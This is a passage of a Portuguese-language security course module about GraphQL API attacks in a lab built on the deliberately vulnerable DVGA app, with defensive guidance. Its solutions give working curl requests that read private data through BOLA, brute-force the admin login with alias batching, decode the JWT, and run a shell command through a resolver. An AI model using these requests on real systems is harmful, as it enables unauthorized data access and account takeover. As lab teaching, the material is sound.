+  {"name":"OwnerObject","kind":"OBJECT"},{"name":"UserObject","kind":"OBJECT"},
+  {"name":"Mutations","kind":"OBJECT"}, ...]}}}
+```
+
+A introspection respondeu: existe um tipo `PasteObject` e um `OwnerObject`. Agora
+descubra os **argumentos** da query `pastes` — é aí que mora a pista.
+
+<Hint title="Dica 1 — perguntar os campos e argumentos de um tipo">
+Peça os campos do tipo `Query`, com os argumentos de cada um:
+`query{__type(name:"Query"){fields{name args{name}}}}`. Procure a query `pastes`
+na resposta e repare nos nomes dos argumentos dela.
+</Hint>
+
+<Hint title="Dica 2 — o argumento que a interface não usa">
+A query `pastes` aceita um argumento `public` (um booleano). A página inicial usa
+`public: true` (os pastes públicos). Tente `pastes(public: false)` e peça, de cada
+um, os campos `title`, `content` e `owner { name }`. Conte quantos vieram e leia o
+`name` do dono. A flag é `FLAG{quantidade-dono}`.
+</Hint>
+
+<Solution title="Solução da Missão 1">
+Os argumentos da query `pastes`, revelados pela introspection:
+
+```console
+$ curl -s -X POST http://dvga:5013/graphql \
+    -H 'Content-Type: application/json' \
+    -d '{"query":"query{__type(name:\"Query\"){fields{name args{name}}}}"}' \
+  | python3 -m json.tool | grep -A6 '"name": "pastes"'
+            "name": "pastes",
+            "args": [
+                { "name": "public" },
+                { "name": "limit" },
+                { "name": "filter" }
+            ],
+```
+
+Agora peça os pastes privados, com os campos que a interface esconde:
+
+```console
+$ curl -s -X POST http://dvga:5013/graphql \
+    -H 'Content-Type: application/json' \
+    -d '{"query":"query{pastes(public:false){id title content ipAddr owner{name}}}"}' \
+  | python3 -m json.tool
+{
+    "data": {
+        "pastes": [
+            { "id": "2", "title": "555-555-1337", "content": "My Phone Number",
+              "ipAddr": "127.0.0.1", "owner": { "name": "DVGAUser" } },
+            { "id": "1", "title": "Testing Testing", "content": "My First Paste",
+              "ipAddr": "127.0.0.1", "owner": { "name": "DVGAUser" } }
+        ]
+    }
+}
+```
+
+Dois pastes privados, que a página inicial nunca listou, lidos **sem login** —
+inclusive os campos `content` e `ipAddr`, que a interface não mostraria. O dono de
+ambos é o `DVGAUser`. Monte a flag no formato `FLAG{quantidade-dono}` com esses
+dois valores: o número de pastes privados (**2**) e o nome do dono.
+
+Nenhum resolver conferiu se você podia ver aqueles objetos: é
+<GlossaryTerm term="excessive data exposure">exposição excessiva de dados</GlossaryTerm>
+somada a <GlossaryTerm term="BOLA">BOLA</GlossaryTerm>, tudo entregue porque o
+schema te disse como pedir.
+</Solution>
+
+<FlagInput task="missao-1-dados-privados" />
+
+### 5.4 Missão 2 — Uma requisição, muitas senhas (batching)
+
+**Cenário:** a API tem uma mutation `login(username, password)` que devolve um
+token quando a senha está certa. Você vai descobrir a senha do `admin` — mas sem
+mandar uma requisição por tentativa (o que um limite de taxa pegaria). Vai mandar
+**todas** as tentativas numa requisição só, com aliases.
+
+**Seu objetivo:** recuperar a senha do `admin` e, do token devolvido (um JWT), ler
+o campo `identity`. A flag é `FLAG{identity-senha}`.
+
+Primeiro, veja o que uma tentativa isolada responde (uma senha errada):
+
+```console
+$ curl -s -X POST http://dvga:5013/graphql \
+    -H 'Content-Type: application/json' \
+    -d '{"query":"mutation{login(username:\"admin\",password:\"errada\"){accessToken}}"}'
+{"errors":[{"message":"Authentication Failure","path":["login"]}],"data":{"login":null}}
+```
+
+Senha errada → `Authentication Failure`. Agora o pulo do gato: em vez de um laço de
+muitas requisições, monte **uma** mutation com vários
+<GlossaryTerm term="GraphQL alias">aliases</GlossaryTerm> (`a:`, `b:`, `c:`...),
+cada um tentando uma senha de uma pequena lista.
+
+<Hint title="Dica 1 — a sintaxe do alias">
+Um alias é um apelido antes do campo: `a: login(username:"admin", password:"123456"){accessToken}`.
+Você pode pôr vários na mesma mutation. Use uma lista curta de senhas comuns
+(`123456`, `admin`, `root`, `letmein`, `changeme`, `password`). O alias que **não**
+retornar `null` acertou.
+</Hint>
+
+<Hint title="Dica 2 — ler o identity de dentro do JWT">
+O `accessToken` é um <GlossaryTerm term="JWT">JWT</GlossaryTerm>: três partes
+separadas por ponto. Pegue a **segunda** (o payload), troque `-_` por `+/`,
+complete o padding e decodifique de Base64 — é um JSON com o campo `identity`
+(como você fez no 3.4 e no 4.5). A flag é `FLAG{identity-senha}`.
+</Hint>
+
+<Solution title="Solução da Missão 2">
+Uma única requisição testando seis senhas, cada uma num alias:
+
+```console
+$ curl -s -X POST http://dvga:5013/graphql \
+    -H 'Content-Type: application/json' \
+    -d '{"query":"mutation{
+      a:login(username:\"admin\",password:\"123456\"){accessToken}
+      b:login(username:\"admin\",password:\"admin\"){accessToken}
+      c:login(username:\"admin\",password:\"root\"){accessToken}
+      d:login(username:\"admin\",password:\"letmein\"){accessToken}
+      e:login(username:\"admin\",password:\"changeme\"){accessToken}
+      f:login(username:\"admin\",password:\"password\"){accessToken}}"}' \
+  | python3 -c '
+import sys, json
+d = json.load(sys.stdin)["data"]
+for alias, val in d.items():
+    if val:
+        print("acertou no alias", alias, "-> token:", val["accessToken"][:32], "...")'
+acertou no alias e -> token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 ...
+```
+
+O alias `e` (senha `changeme`) foi o único que devolveu um token — seis tentativas
+numa requisição só. Agora decodifique o payload do JWT para ler o `identity`:
+
+```console
+$ TOKEN=$(curl -s -X POST http://dvga:5013/graphql \
+    -H 'Content-Type: application/json' \
+    -d '{"query":"mutation{login(username:\"admin\",password:\"changeme\"){accessToken}}"}' \
+  | python3 -c 'import sys,json; print(json.load(sys.stdin)["data"]["login"]["accessToken"])')
+
+$ echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | python3 -c '
+import sys, base64, json
+s = sys.stdin.read().strip(); s += "=" * (-len(s) % 4)
+p = json.loads(base64.b64decode(s))
+print("alg no header: HS256 | identity:", p["identity"], "| type:", p["type"])'
+alg no header: HS256 | identity: admin | type: access
+```
+
+O token é um JWT `HS256` cujo `identity` é `admin` (repare: o payload é legível,
+como no 3.4 — a assinatura protege contra adulteração, não contra leitura). Junte o
+`identity` e a senha que você recuperou no formato `FLAG{identity-senha}`.
+
+O que você explorou aqui é o **API4:2023 (Unrestricted Resource Consumption)**: um
+<GlossaryTerm term="rate limiting">rate limit</GlossaryTerm> que contasse
+requisições teria visto **uma** requisição, enquanto você fez seis tentativas de
+login. O batching passou por baixo.
+</Solution>
+
+<FlagInput task="missao-2-batching-login" />
+
+### 5.5 Walkthrough: o poder dos resolvers (sem flag)
+
+Antes de desligar, veja — só para entender o impacto — por que um resolver é
+perigoso. A DVGA tem uma query `systemDiagnostics` que, com a credencial do admin
+que você acabou de recuperar, **roda um comando** no servidor:
+
+```console
+$ curl -s -X POST http://dvga:5013/graphql \
+    -H 'Content-Type: application/json' \
+    -d '{"query":"query{systemDiagnostics(username:\"admin\",password:\"changeme\",cmd:\"id\")}"}'
+{"data":{"systemDiagnostics":"uid=1000(dvga) gid=1000(dvga) groups=1000(dvga)\n"}}
+```
+
+Um resolver que executa comando (uma <GlossaryTerm term="command injection">command
+injection</GlossaryTerm> por design, do 4.6) e outro (`importPaste`) que busca uma
+URL escolhida pelo cliente (<GlossaryTerm term="SSRF">SSRF</GlossaryTerm>, do 4.7)
+mostram o recado do módulo: a API é só a porta; o estrago mora no que cada resolver
+faz sem validar. Tudo isto fica **preso no contêiner** isolado — jamais faça o
+equivalente fora de um lab autorizado.
+
+### 5.6 Desligar o laboratório
+
+```console
+$ scripts/lab.sh down dvga
+```
+
+Pela plataforma, o botão **Desligar** no painel faz o mesmo. A DVGA guarda o banco
+dentro do contêiner, então **Resetar** devolve tudo ao ponto de fábrica — útil se
+você criou pastes e quer os valores originais da Missão 1 de volta.
+
+## 6. Variações e aprofundamento
+
+- **Introspection desligada? O schema ainda vaza.** No modo "Hard" da DVGA
+  (`http://dvga:5013/difficulty/hard`), a introspection responde
+  `400 Bad Request: Introspection is Disabled`. Mas peça um campo com um erro de
+  digitação e veja o <GlossaryTerm term="field suggestion">field suggestion</GlossaryTerm>
+  entregar o nome certo: `query{pastez{id}}` responde *"Did you mean \"pastes\" or
+  \"paste\"?"*. Com paciência, reconstrói-se boa parte do schema sem introspection.
+- **Negação de serviço por profundidade e aninhamento.** No schema da DVGA, um
+  `PasteObject` tem um `owner`, que tem `pastes`, que têm `owner`... Uma query pode
+  aninhar isso muitas vezes e explodir em trabalho — o que a
+  <GlossaryTerm term="query depth limiting">limitação de profundidade</GlossaryTerm>
+  existe para barrar.
+- **Batching para outras coisas além de login.** O mesmo truque de aliases serve
+  para enumerar objetos por id em lote (`a:paste(id:1) b:paste(id:2) ...`), achando
+  BOLAs em massa numa requisição só.
+- **SSRF via mutation.** A mutation `importPaste(host, port, path, scheme)` faz o
+  **servidor** buscar uma URL que você escolhe. Apontada para um serviço interno,
+  é o <GlossaryTerm term="SSRF">SSRF</GlossaryTerm> do 4.7 — no lab, contida pela
+  rede interna sem rota para fora.
+- **Log que vira vazamento.** A DVGA tem uma query `audits` que devolve o histórico
+  de queries de **todos** os chamadores — um brinde de reconhecimento para o
+  atacante, e um lembrete de que até telemetria precisa de autorização.
+- **GraphQL sobre WebSocket (subscriptions).** Além de queries e mutations, o
+  GraphQL tem *subscriptions*, que abrem um canal <GlossaryTerm term="WebSocket">WebSocket</GlossaryTerm>
+  (do 2.5) para o servidor empurrar atualizações — outra superfície que precisa das
+  mesmas checagens de autorização.
+
+## 7. Erros comuns
+
+- **`"message":"Must provide query string"`** ou `400`: o corpo não chegou como
+  JSON com o campo `query`. Confira o `-H 'Content-Type: application/json'` e as
+  aspas escapadas dentro do `-d`.
+- **Erros de aspas no `curl`.** A query vai dentro de um JSON, dentro de aspas do
+  shell: é fácil errar o escape. Se empacar, salve a query num arquivo `.json` e
+  use `curl ... -d @consulta.json` — fica muito mais legível.
+- **Confundir "endpoint autenticado" com "API segura".** Exigir login para falar
+  com `/graphql` não protege os objetos: uma query autenticada ainda pede o que não
+  é sua. A autorização é por **resolver/objeto**, não pelo endpoint.
+- **Achar que desligar a introspection fecha a porta.** Vimos no CVE do SuiteCRM
+  (nota baixa) e no field suggestion: é higiene, não cura. Não pare por aí.
+- **Rate limit por requisição.** Se você "protegeu" o login contando requisições
+  por IP, o batching passa por baixo. Limite por **custo/quantidade de operações**.
+- **Flag da Missão 1 com número errado.** Se você criou pastes antes de contar,
+  **Resetar** o lab devolve os dois pastes privados originais. Conte só os que
+  `pastes(public:false)` retorna de fábrica.
+
+## 8. Defesa e mitigação
+
+A boa notícia se repete do 4.5: a cura é conceitualmente simples e mora **no
+servidor**. A má notícia também: tem de estar em **cada** resolver e **cada**
+endpoint.
+
+### 8.1 Autorização em cada resolver (a raiz)
+
+Para **cada** campo que devolve ou altera um objeto, o resolver responde, depois de
+autenticar, as duas perguntas do 4.5: **posse** (este objeto é do chamador?) e
+**papel** (ele pode esta operação?). No resolver dos pastes, a cura do BOLA da
+Missão 1 é uma checagem de posse e um filtro por dono — nunca um `public:false` que
+devolve os privados de todo mundo:
+
+```python
+# Antes (vulnerável): devolve os privados de QUALQUER dono.
+def resolve_pastes(root, info, public=True):
+    return Paste.query.filter_by(public=public).all()
+
+# Depois (seguro): exige login e devolve só o que é do usuário do token.
+def resolve_pastes(root, info, public=True):
+    user = require_auth(info)                       # 401 se não autenticado
+    q = Paste.query.filter_by(public=public)
+    if not public:
+        q = q.filter_by(owner_id=user.id)           # posse: só os SEUS privados
+    return q.all()
+```
+
+E não devolva campos sensíveis "porque a tela filtra": modele o schema para que
+`ipAddr`, hashes e afins **não existam** no tipo exposto, ou só apareçam para quem
+tem papel para vê-los (fecha a <GlossaryTerm term="excessive data exposure">exposição
+excessiva de dados</GlossaryTerm>).
+
+### 8.2 Limitar o consumo — por custo, não por requisição
+
+Contra o batching e as queries pesadas (API4), três limites que o
+`require_auth` não dá:
+
+- <GlossaryTerm term="query depth limiting">**Limite de profundidade**</GlossaryTerm>:
+  recuse queries aninhadas além de N níveis.
+- <GlossaryTerm term="query cost analysis">**Análise de custo**</GlossaryTerm>: dê
+  um preço a cada campo e recuse a query cujo custo total passe do teto — isso conta
+  as operações **dentro** de uma requisição, então o batching não escapa.
+- **Rate limit por custo e por usuário**, não só por requisição; e um teto de
+  quantas operações/aliases uma requisição pode ter.
+
+### 8.3 Reduzir a superfície do GraphQL
+
+- **Desligue a introspection e o explorador (GraphiQL) em produção** — higiene
+  (lembre: ajuda, não cura), e **desligue também o field suggestion** para não
+  vazar campos pela dica de digitação.
+- Considere <GlossaryTerm term="persisted query">persisted queries</GlossaryTerm>:
+  o servidor só aceita queries pré-cadastradas (por hash), não qualquer query
+  arbitrária. Corta de uma vez a maior parte do abuso.
+- **Trate cada resolver como uma função perigosa:** valide a entrada, use consultas
+  parametrizadas (contra injeção) e jamais deixe um resolver buscar uma URL ou rodar
+  um comando com valor vindo do cliente sem allowlist (fecha SSRF/command injection).
+
+### 8.4 Conhecer o próprio inventário (o antídoto do Optus)
+
+Contra o **API9 (<GlossaryTerm term="improper inventory management">Improper
+Inventory Management</GlossaryTerm>)**: mantenha um inventário vivo de todas as
+APIs, versões e ambientes expostos; aposente endpoints antigos e de teste; e
+aplique a mesma correção a **todos** os domínios e subdomínios (o erro da Optus foi
+corrigir o domínio principal e esquecer o subdomínio). Você não defende o que não
+sabe que existe.
+
+### 8.5 Detectar
+
+- Registre e monitore: picos de erros `Authentication Failure`, requisições com
+  muitos aliases, queries muito profundas, e qualquer uso de introspection vindo de
+  fora. São as assinaturas dos ataques deste módulo.
+- Testes automáticos de autorização por resolver: para cada operação, um teste que
+  tenta acessar o objeto de outro usuário e **espera** negação.
+
+## 9. Exercícios
+
+### Desafios práticos (sem flag)
+
+1. **Mapa completo.** Monte uma introspection query que liste, para cada tipo, os
+   campos e os tipos de cada campo. Desenhe num papel o schema da DVGA (tipos e
+   relações). Esse é o artefato que um pentester entrega ao relatar a superfície.
+2. **BOLA em lote.** Com aliases, leia os pastes de id 1 a 5 numa **única**
+   requisição (`a:paste(id:1){title} b:paste(id:2){title} ...`). Observe como o
+   batching também acelera a enumeração.
+3. **Introspection no modo Hard.** Ligue o modo Hard, confirme que a introspection
+   é recusada e reconstrua o nome de ao menos dois campos usando só o
+   <GlossaryTerm term="field suggestion">field suggestion</GlossaryTerm>.
+4. **A defesa em duas frases.** Para cada missão, escreva a correção no estilo de um
+   relatório: o que fazer e **em qual resolver**.
+
+### Quiz
+
+<Quiz task="quiz-final" />
+
+## 10. Resumo e glossário
+
+As APIs são hoje a maior superfície de ataque, e a falha que mais importa nelas não
+é injeção: é **autorização**. O GraphQL concentra tudo num endpoint só, entrega o
+mapa de graça pela **introspection** e, com **batching** e **aliases**, dá ao
+atacante uma requisição que vale por mil. Você mapeou a DVGA, leu dados privados que
+a tela escondia (exposição de dados + BOLA) e quebrou um login derrotando o limite
+de taxa — e viu que a cura mora em **cada resolver**: checar posse e papel, limitar
+custo e profundidade, e nunca confiar na interface nem na introspection como defesa.
+
+### Cola rápida
+
+- **O risco nº 1 de API é BOLA** (o IDOR das APIs): o servidor confia no id do
+  cliente e devolve o objeto sem checar o dono.
+- **Introspection** = o schema inteiro numa query. Desligar ajuda, não cura (CVE do
+  SuiteCRM = nota baixa; field suggestion ainda vaza).
+- **Exposição excessiva de dados:** a API devolve campos demais; o atacante lê o que
+  a tela esconderia.
+- **Batching + aliases:** muitas operações numa requisição → derrotam rate limit por
+  requisição (API4). Defenda por **custo/profundidade**.
+- **Resolver é código:** pode rodar comando ou fazer SSRF; valide e autorize cada um.
+- **API9 (inventário):** a API esquecida da Optus derrubou 9,5 milhões. Defenda o que
+  você nem sabe que está no ar.
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- OWASP API Security Top 10 — [edição de 2023](https://owasp.org/API-Security/editions/2023/en/0x11-t10/) (comece por API1, API4 e API9).
+- OWASP — [GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html): introspection, limite de profundidade/custo e batching, com as defesas.
+- [Damn Vulnerable GraphQL Application](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application) — o alvo do lab, com a lista de cenários para você explorar além das duas missões.
